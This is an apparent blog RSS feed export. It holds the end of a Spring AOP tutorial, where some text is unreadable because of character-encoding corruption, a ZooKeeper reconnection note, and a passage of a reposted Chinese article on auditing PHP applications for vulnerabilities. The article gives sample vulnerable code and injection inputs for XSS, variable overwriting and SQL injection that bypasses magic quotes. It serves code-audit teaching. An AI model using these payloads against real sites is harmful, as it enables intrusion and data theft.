org.aspectj.lang.JoinPoint;<BR>/**<BR>&nbsp;* &Aacute;&ordf;°&icirc;&micro;÷&sup2;é&frac34;&Ouml;&micro;&Auml;&Igrave;&frac12;&Ocirc;±&frac12;&laquo;&Auml;ú&micro;&Auml;&Euml;ù&Oacute;&ETH;&ETH;&ETH;&para;&macr;&para;&frac14;&frac14;&Ccedil;&Acirc;&frac14;&Ocirc;&Uacute;°&cedil;&iexcl;&pound;<BR>&nbsp;* @author BeanSoft<BR>&nbsp;*/<BR>public class FBI {<BR>&nbsp;&nbsp;&nbsp; public void before(JoinPoint point){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Man man = (Man)point.getTarget();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println("FBI ·&cent;&Iuml;&Ouml;" + man.getName() + "&Otilde;&yacute;&Ocirc;&Uacute;&frac12;&oslash;&ETH;&ETH; " + <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; point.getSignature().getName()&nbsp; + " &raquo;&icirc;&para;&macr;&iexcl;&pound;");<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR></P>  <P>3.4 AOPTest.java</P>  <P>import org.springframework.context.ApplicationContext;<BR>import org.springframework.context.support.ClassPathXmlApplicationContext;</P>  <P>public class AOPTest {</P>  <P>&nbsp;&nbsp;&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ApplicationContext ctx = new ClassPathXmlApplicationContext("beans.xml");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Man man = (Man) ctx.getBean("man");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; man.qq();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; man.mm();<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR></P>  <P>AOP错误解决方案</P>  <P>问题1：Exception in thread "main" java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory at org.springframework.util.ClassUtils.&lt;clinit&gt;(ClassUtils.java:67)&nbsp;&nbsp; at org.springframework.core.io.DefaultResourceLoader.&lt;init&gt;(DefaultResourceLoader.java:52) at org.springframework.context.support.AbstractApplicationContext.&lt;init&gt;(AbstractApplicationContext.java:184) at org.springframework.context.support.AbstractRefreshableApplicationContext.&lt;init&gt;(AbstractRefreshableApplicationContext.java:80) at org.springframework.context.support.AbstractXmlApplicationContext.&lt;init&gt;(AbstractXmlApplicationContext.java:58)&nbsp;&nbsp; at <BR>加上：commons-logging.jar log4j-1.2.11.jar</P>  <P>问题2：Exception in thread "main" org.springframework.beans.factory.BeanDefinitionStoreException: Unexpected exception parsing XML document from class path resource [text.xml]; nested exception is java.lang.NoClassDefFoundError: org/aspectj/weaver/reflect/ReflectionWorld$ReflectionWorldException<BR>Caused by: java.lang.NoClassDefFoundError: org/aspectj/weaver/reflect/ReflectionWorld$ReflectionWorldException<BR>&nbsp;&nbsp;&nbsp; at java.lang.Class.forName0(Native Method)<BR>&nbsp;<BR>加上：aspectjweaver.jar<BR>&nbsp;<BR>问题3：Exception in thread "main" org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'logBean' defined in class path resource [text.xml]: Initialization of bean failed; nested exception is org.springframework.aop.framework.AopConfigException: Cannot proxy target class because CGLIB2 is not available. Add CGLIB to the class path or specify proxy interfaces.<BR>Caused by: org.springframework.aop.framework.AopConfigException: Cannot proxy target class because CGLIB2 is not available. Add CGLIB to the class path or specify proxy interfaces.<BR>加上：cglib-2.1.3.jar</P>  <P>问题4：xception in thread "main" org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'logBean' defined in class path resource [text.xml]: Initialization of bean failed; nested exception is java.lang.NoClassDefFoundError: org/objectweb/asm/Type<BR>Caused by: java.lang.NoClassDefFoundError: org/objectweb/asm/Type<BR>&nbsp;&nbsp;&nbsp; at net.sf.cglib.core.TypeUtils.parseType(TypeUtils.java:180)<BR>加上：asm.jar</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832511115999/</guid>
    </item>
    <item>
      <title>
<![CDATA[zookeeper自动重连机制]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720122203433282/</link>
      <description>
<![CDATA[<div>zookeeper的客户端API支持自动重连,</div><div>但是在一种情况下,即客户端长期和服务器断开连接,则停止重新连接,需要<b>手工重连</b>.　伪代码如下:</div><div><pre style="width: auto; color: rgb(122, 71, 7); overflow-x: auto !important; overflow-y: auto !important; line-height: 20px;"  >zookeeper_init(server_list_.c_str(), class_zoo_watcher, CONNECT_TIMEOUT, NULL, NULL, 0); void class_zoo_watcher(zhandle_t * zzh, int type, int state, const char * path, void* /*context*/) {      if (type == ZOO_SESSION_EVENT) {         if (state == ZOO_EXPIRED_SESSION_STATE) {             zookeeper_close(zzh);             zookeeper_init(server_list_.c_str(), class_zoo_watcher, CONNECT_TIMEOUT, NULL, NULL, 0);         }     } }</pre></div><div><b>测试方法:</b></div><div>　启动客户端程序,　发送STOP信号hang住进程,过一段时间后再恢复,可以在日志中看到重连的日志</div><div>~/valgrind/bin/valgrind --leak-check=full --show-reachable=yes ./test_zkclient &amp;&gt; val.log &amp;</div><div>HJZID=$(ps aux|grep val|grep -v grep|awk '{print $2}')</div><div>while [ 1 ];&nbsp;</div><div>do</div><div>&nbsp; &nbsp; kill -STOP $HJZID</div><div>&nbsp; &nbsp; sleep 5</div><div>&nbsp; &nbsp; kill -CONT $HJZID</div><div>&nbsp; &nbsp; sleep 5</div><div>done</div><div><br></div><wbr>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720122203433282/</guid>
    </item>
    <item>
      <title>
<![CDATA[[转]高级PHP应用程序漏洞审核技术]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720105293435603/</link>
      <description>
<![CDATA[<div><span>原文地址：http://www.blogjava.net/jasonxiao/archive/2010/06/28/324691.html<br></span><span><span></span></span></div><p>[目录]</p>
<p>1. 前言<br>
2. 传统的代码审计技术<br>
3. PHP版本与应用代码审计<br>
4. 其他的因素与应用代码审计<br>
5. 扩展我们的字典<br>
&nbsp; 5.1 变量本身的key<br>
&nbsp; 5.2 变量覆盖<br>
&nbsp;&nbsp;&nbsp; 5.2.1 遍历初始化变量<br>
&nbsp;&nbsp;&nbsp; 5.2.2 parse_str()变量覆盖漏洞<br>
&nbsp;&nbsp;&nbsp; 5.2.3 import_request_variables()变量覆盖漏洞<br>
&nbsp;&nbsp;&nbsp; 5.2.4 PHP5 Globals <br>
&nbsp; 5.3 magic_quotes_gpc与代码安全<br>
&nbsp;&nbsp;&nbsp; 5.3.1 什么是magic_quotes_gpc<br>
&nbsp;&nbsp;&nbsp; 5.3.2 哪些地方没有魔术引号的保护<br>
&nbsp;&nbsp;&nbsp; 5.3.3 变量的编码与解码<br>
&nbsp;&nbsp;&nbsp; 5.3.4 二次攻击<br>
&nbsp;&nbsp;&nbsp; 5.3.5 魔术引号带来的新的安全问题<br>
&nbsp;&nbsp;&nbsp; 5.3.6 变量key与魔术引号<br>
&nbsp; 5.4 代码注射<br>
&nbsp;&nbsp;&nbsp; 5.4.1 PHP中可能导致代码注射的函数<br>
&nbsp;&nbsp;&nbsp; 5.4.2 变量函数与双引号<br>
&nbsp; 5.5 PHP自身函数漏洞及缺陷<br>
&nbsp;&nbsp;&nbsp; 5.5.1 PHP函数的溢出漏洞<br>
&nbsp;&nbsp;&nbsp; 5.5.2 PHP函数的其他漏洞<br>
&nbsp;&nbsp;&nbsp; 5.5.3 session_destroy()删除文件漏洞<br>
&nbsp;&nbsp;&nbsp; 5.5.4 随机函数<br>
&nbsp; 5.6 特殊字符<br>
&nbsp;&nbsp;&nbsp; 5.6.1 截断<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.6.1.1 include截断<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.6.1.2 数据截断<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.6.1.3 文件操作里的特殊字符<br>
6. 怎么进一步寻找新的字典<br>
7. DEMO<br>
8. 后话<br>
9. 附录</p>
<p><br>
一、前言</p>
<p>&nbsp;&nbsp;&nbsp; PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强<br>
大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型<br>
门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，<br>
Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应<br>
用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应<br>
用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇<br>
佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。也就是这样的形<br>
势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些<br>
大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很<br>
多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没<br>
有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术<br>
经验和大家分享。</p>
<p>&nbsp;&nbsp;&nbsp; 另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在<br>
这里需要感谢他们，：）</p>
<p><br>
二、传统的代码审计技术</p>
<p>&nbsp;&nbsp;&nbsp; WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用<br>
必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得<br>
MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输<br>
入”理解为只是gpc[$_GET,$_POST,$_COOKIE]，但是变量在传递过程产生了n多的变化。导致<br>
很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。</p>
<p>&nbsp;&nbsp;&nbsp; PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致<br>
安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜<br>
索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的<br>
字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。</p>
<p>&nbsp;&nbsp;&nbsp; 其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用<br>
程序代码的审核，但是这些也依靠了我们上面提到的字典。</p>
<p><br>
三、PHP版本与应用代码审计</p>
<p>&nbsp;&nbsp;&nbsp; 到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：</p>
<p>php4 68% <br>
2000-2007，No security fixes after 2008/08，最终版本是php4.4.9</p>
<p>php5 32% <br>
2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!）</p>
<p>php6 <br>
目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc。<br>
（这个不是今天讨论的范围）</p>
<p>&nbsp;&nbsp;&nbsp; 由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。<br>
这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。</p>
<p><br>
四、其他的因素与应用代码审计</p>
<p>&nbsp;&nbsp;&nbsp; 很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素<br>
有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营<br>
win/*nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同<br>
的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。</p>
<p>&nbsp;&nbsp;&nbsp; 所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，<br>
PHP版本等信息。</p>
<p><br>
五、扩展我们的字典</p>
<p>下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。</p>
<p>5.1 变量本身的key</p>
<p>&nbsp;&nbsp;&nbsp; 说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的<br>
程序把变量本身的key也当变量提取给函数处理。</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
//key.php?aaaa'aaa=1&amp;bb'b=2 <br>
//print_R($_GET); <br>
foreach ($_GET AS $key =&gt; $value)<br>
{<br>
print $key."\n";<br>
}<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：</p>
<p>--code-------------------------------------------------------------------------<br>
key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询<br>
呢？：） </p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：通读代码<br>
+++++++++++++++++++++++++</p>
<p><br>
5.2 变量覆盖（variable-overwrite）</p>
<p>&nbsp;&nbsp;&nbsp; 很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指<br>
定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：</p>
<p>5.2.1 遍历初始化变量</p>
<p>请看如下代码：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
//var.php?a=fuck<br>
$a='hi';<br>
foreach($_GET as $key =&gt; $value) {<br>
$$key = $value;<br>
}<br>
print $a;<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分<br>
的代码：</p>
<p>--code-------------------------------------------------------------------------<br>
$chs = '';<br>
if($_POST &amp;&amp; $charset != 'utf-8') {<br>
$chs = new Chinese('UTF-8', $charset);<br>
foreach($_POST as $key =&gt; $value) {<br>
$$key = $chs-&gt;Convert($value);<br>
}<br>
unset($chs);<br>
-------------------------------------------------------------------------------</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：通读代码<br>
+++++++++++++++++++++++++</p>
<p><br>
5.2.2 parse_str()变量覆盖漏洞（CVE-2007-3205）、mb_parse_str() </p>
<p>--code-------------------------------------------------------------------------<br>
//var.php?var=new<br>
$var = 'init';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
parse_str($_SERVER['QUERY_STRING']); <br>
print $var;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 该函数一样可以覆盖数组变量，上面的代码是通过$_SERVER['QUERY_STRING']来提取变<br>
量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：</p>
<p>--code-------------------------------------------------------------------------<br>
//var.php?var=1&amp;a[1]=var1%3d222<br>
$var1 = 'init';<br>
parse_str($a[$_GET['var']]);<br>
print $var1;<br>
-------------------------------------------------------------------------------</p>
<p>上面的代码通过提交$var来实现对$var1的覆盖。</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略（parse_str）<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：查找字符parse_str<br>
+++++++++++++++++++++++++</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略（mb_parse_str）<br>
-------------------------<br>
PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2<br>
系统要求：无<br>
审计策略：查找字符mb_parse_str<br>
+++++++++++++++++++++++++</p>
<p><br>
5.2.3 import_request_variables()变量覆盖漏洞（CVE-2007-1396）</p>
<p>--code-------------------------------------------------------------------------<br>
//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1<br>
echo 'GLOBALS '.(int)ini_get("register_globals")."n";<br>
import_request_variables('GPC');<br>
if ($_SERVER['REMOTE_ADDR'] != '10.1.1.1') die('Go away!');<br>
echo 'Hello admin!';<br>
-------------------------------------------------------------------------------</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略（import_request_variables）<br>
-------------------------<br>
PHP版本要求：php4&lt;4.4.1 php5&lt;5.2.2<br>
系统要求：无<br>
审计策略：查找字符import_request_variables<br>
+++++++++++++++++++++++++</p>
<p><br>
5.2.4 PHP5 Globals </p>
<p>&nbsp;&nbsp;&nbsp; 从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?<br>
// register_globals =ON<br>
//foo.php?GLOBALS[foobar]=HELLO<br>
php echo $foobar; <br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 但是很多的程序没有考虑到这点，请看如下代码：</p>
<p>--code-------------------------------------------------------------------------<br>
//为了安全取消全局变量<br>
//var.php?GLOBALS[a]=aaaa&amp;b=111<br>
if (ini_get('register_globals')) foreach($_REQUEST as $k=&gt;$v) 
unset(${$k});<br>
print $a;<br>
print $_GET[b];<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf<br>
攻击。</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：通读代码<br>
+++++++++++++++++++++++++</p>
<p><br>
5.3 magic_quotes_gpc与代码安全</p>
<p>5.3.1 什么是magic_quotes_gpc</p>
<p>&nbsp;&nbsp;&nbsp; 当打开时，所有的 '（单引号），"（双引号），\（反斜线）和 NULL 字符都会被自动加上一个<br>
反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql_escape_string()、<br>
mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影<br>
响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤<br>
变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是<br>
就在他们放弃的同时也放过很多致命的安全漏洞。 ：）</p>
<p>5.3.2 哪些地方没有魔术引号的保护<br>
&nbsp;&nbsp;&nbsp; <br>
1) $_SERVER变量 </p>
<p>&nbsp;&nbsp;&nbsp; PHP5的$_SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwarded-For的漏洞<br>
猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略（$_SERVER变量）<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：查找字符_SERVER<br>
+++++++++++++++++++++++++</p>
<p><br>
2) getenv()得到的变量（使用类似$_SERVER变量）<br>
&nbsp;&nbsp; <br>
+++++++++++++++++++++++++<br>
漏洞审计策略（getenv()）<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：查找字符getenv<br>
+++++++++++++++++++++++++</p>
<p><br>
3) $HTTP_RAW_POST_DATA与PHP输入、输出流</p>
<p>&nbsp;&nbsp;&nbsp; 主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：</p>
<p>--code-------------------------------------------------------------------------<br>
if ( !isset( $HTTP_RAW_POST_DATA ) ) {<br>
$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );<br>
}<br>
if ( isset($HTTP_RAW_POST_DATA) )<br>
$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);<br>
-------------------------------------------------------------------------------<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+++++++++++++++++++++++++<br>
漏洞审计策略（数据流）<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：查找字符HTTP_RAW_POST_DATA或者php://input<br>
+++++++++++++++++++++++++</p>
<p><br>
4) 数据库操作容易忘记'的地方如：in()/limit/order by/group by<br>
&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 如Discuz!&lt;5.0的pm.php：<br>
&nbsp;&nbsp;&nbsp;&nbsp; <br>
--code-------------------------------------------------------------------------<br>
if(is_array($msgtobuddys)) {<br>
$msgto = array_merge($msgtobuddys, array($msgtoid));<br>
......<br>
foreach($msgto as $uid) {<br>
$uids .= $comma.$uid;<br>
$comma = ',';<br>
}<br>
......<br>
$query = $db-&gt;query("SELECT m.username, mf.ignorepm FROM 
{$tablepre}members m<br>
LEFT JOIN {$tablepre}memberfields mf USING(uid)<br>
WHERE m.uid IN ($uids)");<br>
-------------------------------------------------------------------------------</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：查找数据库操作字符（select,update,insert等等）<br>
+++++++++++++++++++++++++</p>
<p><br>
5.3.3 变量的编码与解码</p>
<p>&nbsp;&nbsp;&nbsp; 一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中<br>
就悄悄的绕过你的过滤的安全防线。</p>
<p>&nbsp;&nbsp;&nbsp; 这个类型的主要函数有：</p>
<p>1) stripslashes() 这个其实就是一个decode-addslashes()</p>
<p>2) 其他字符串转换函数：</p>
<p>base64_decode -- 对使用 MIME base64 编码的数据进行解码<br>
base64_encode -- 使用 MIME base64 对数据进行编码<br>
rawurldecode -- 对已编码的 URL 字符串进行解码<br>
rawurlencode -- 按照 RFC 1738 对 URL 进行编码<br>
urldecode -- 解码已编码的 URL 字符串<br>
urlencode -- 编码 URL 字符串<br>
......<br>
（另外一个 unserialize/serialize）</p>
<p>3) 字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：</p>
<p>--code-------------------------------------------------------------------------<br>
$sql = "SELECT * FROM article WHERE 
articleid='".urldecode($_GET[id])."'";<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：</p>
<p>--code-------------------------------------------------------------------------<br>
SELECT * FROM article WHERE articleid='''<br>
-------------------------------------------------------------------------------</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：查找对应的编码函数<br>
+++++++++++++++++++++++++</p>
<p><br>
5.3.4 二次攻击（详细见附录[1]）</p>
<p>1) 数据库出来的变量没有进行过滤</p>
<p>2) 数据库的转义符号：</p>
<p>&nbsp; * mysql/oracle转义符号同样是\（我们提交'通过魔术引号变化为\'，当我们update进入数<br>
据库时，通过转义变为'）</p>
<p>&nbsp; * mssql的转义字符为'（所以我们提交'通过魔术引号变化为\'，mssql会把它当为一个字符<br>
串直接处理，所以魔术引号对于mssql的注射没有任何意义）<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击<br>
我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代<br>
码看成一个vul？</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：通读代码<br>
+++++++++++++++++++++++++</p>
<p><br>
5.3.5 魔术引号带来的新的安全问题</p>
<p>&nbsp;&nbsp;&nbsp; 首先我们看下魔术引号的处理机制：</p>
<p>[\--&gt;\\,'--&gt;\',"--&gt;\",null--&gt;\0]</p>
<p>&nbsp;&nbsp;&nbsp; 这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是<br>
目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：</p>
<p>1) 得到原字符（',\,",null]）</p>
<p>--code-------------------------------------------------------------------------<br>
$order_sn=substr($_GET['order_sn'], 1);</p>
<p>//提交&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '<br>
//魔术引号处理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \'<br>
//substr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '</p>
<p>$sql = "SELECT order_id, order_status, shipping_status, pay_status, 
".<br>
&nbsp;&nbsp; " shipping_time, shipping_id, invoice_no, user_id ".<br>
&nbsp;&nbsp; " FROM " . $ecs-&gt;table('order_info').<br>
&nbsp;&nbsp; " WHERE order_sn = '$order_sn' LIMIT 1";<br>
-------------------------------------------------------------------------------</p>
<p>2) 得到“\”字符</p>
<p>--code-------------------------------------------------------------------------<br>
$order_sn=substr($_GET['order_sn'], 0,1);</p>
<p>//提交&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '<br>
//魔术引号处理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \'<br>
//substr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \&nbsp;&nbsp;&nbsp; </p>
<p>$sql = "SELECT order_id, order_status, shipping_status, pay_status, 
".<br>
&nbsp;&nbsp; " shipping_time, shipping_id, invoice_no, user_id ".<br>
&nbsp;&nbsp; " FROM " . $ecs-&gt;table('order_info').<br>
&nbsp;&nbsp; " WHERE order_sn = '$order_sn' and order_tn='".$_GET['order_tn']."'";<br>
-------------------------------------------------------------------------------<br>
&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 提交内容：</p>
<p>--code-------------------------------------------------------------------------<br>
?order_sn='&amp;order_tn=%20and%201=1/* <br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 执行的SQL语句为：</p>
<p>--code-------------------------------------------------------------------------<br>
SELECT order_id, order_status, shipping_status, pay_status, 
shipping_time, <br>
shipping_id, invoice_no, user_id FROM order_info WHERE order_sn = '\' 
and <br>
order_tn=' and 1=1/*'<br>
-------------------------------------------------------------------------------</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：无<br>
系统要求：无<br>
审计策略：查找字符串处理函数如substr或者通读代码<br>
+++++++++++++++++++++++++</p>
<p><br>
5.3.6 变量key与魔术引号<br>
&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp; 我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
//key.php?aaaa'aaa=1&amp;bb'b=2 <br>
//print_R($_GET); <br>
foreach ($_GET AS $key =&gt; $value)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print $key."\n";<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>1) 当magic_quotes_gpc = On时，在php5.24下测试显示：<br>
&nbsp; <br>
aaaa\'aaa<br>
bb\'b</p>
<p>&nbsp;&nbsp;&nbsp; 从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。<br>
但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php<br>
//key.php?aaaa'aaa[bb']=1 <br>
print_R($_GET); <br>
?&gt;<br>
-------------------------------------------------------------------------------</p>
<p>&nbsp;&nbsp;&nbsp; 结果显示:</p>
<p>Array ( [aaaa'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) )&nbsp;&nbsp; </p>
<p>&nbsp;&nbsp;&nbsp; 数组第一维变量的key不受魔术引号的影响。</p>
<p>+++++++++++++++++++++++++<br>
漏洞审计策略<br>
-------------------------<br>
PHP版本要求：php4和php&lt;5.2.1<br>
系统要求：无<br>
审计策略：通读代码<br>
+++++++++++++++++++++++++</p>
<p><br>
2) 当magic_quotes_gpc = Off时，在php5.24下测试显示：</p>
<p>aaaa'aaa<br>
bb'b</p>
<p>&nbsp;&nbsp;&nbsp; 对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过<br>
addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：</p>
<p>--code-------------------------------------------------------------------------<br>
&lt;?php <br>
//keyvul.php?aaa'aa=1'<br>
//magic_quotes_gpc = Off<br>
